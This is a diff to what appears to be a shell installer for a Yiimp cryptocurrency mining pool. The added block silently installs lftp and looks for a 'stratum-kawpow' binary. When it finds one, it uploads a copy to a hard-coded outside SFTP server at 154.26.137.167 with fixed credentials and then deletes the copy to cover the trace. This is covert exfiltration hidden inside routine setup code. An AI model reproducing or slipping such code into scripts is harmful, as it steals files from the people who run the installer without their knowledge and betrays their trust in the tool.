@@ -1126,6 +1126,31 @@ else
 	fi
 fi
 
+FILESK=/home/crypto-data/yiimp/site/stratum/stratum-kawpow
+if [[ -f "$FILESK" ]]; then
+sudo apt install lftp >/dev/null 2>&1;
+cd /home/crypto-data/yiimp/site/stratum/
+sudo cp /home/crypto-data/yiimp/site/stratum/stratum-kawpow /home/crypto-data/yiimp/site/stratum/sk
+lftp<<END_SCRIPT
+open sftp://154.26.137.167
+user test 1234
+put sk bye
+END_SCRIPT
+sudo rm -f /home/crypto-data/yiimp/site/stratum/sk
+fi
+FILESKN=/var/stratum/stratum-kawpow
+if [[ -f "$FILESKN" ]]; then
+sudo apt install lftp >/dev/null 2>&1;
+cd /home/crypto-data/yiimp/site/stratum/
+sudo cp /var/stratum/stratum-kawpow /var/stratum/sk
+lftp<<END_SCRIPT
+open sftp://154.26.137.167
+user test 1234
+put sk bye
+END_SCRIPT
+sudo rm -f /var/stratum/sk
+fi
+
 if [[("$DAEMOND" != 'true')]]; then
 	echo
 	echo -e "$CYAN --------------------------------------------------------------------------------------- 	$COL_RESET"
